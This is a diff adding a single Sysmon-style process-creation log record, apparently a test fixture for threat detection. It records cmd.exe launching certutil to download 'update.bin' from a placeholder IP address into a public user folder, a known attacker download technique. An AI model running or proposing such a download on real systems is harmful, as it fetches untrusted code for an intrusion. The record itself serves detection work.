@@ -1,0 +1,11 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-10-06 13:22:41.067",
+  "Computer": "WS-HR-021.corp.example",
+  "User": "CORP\\mkelly",
+  "ProcessId": 9216,
+  "Image": "C:\\Windows\\System32\\certutil.exe",
+  "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.10/update.bin C:\\Users\\Public\\update.bin",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+  "ParentCommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://203.0.113.10/update.bin C:\\Users\\Public\\update.bin"
+}
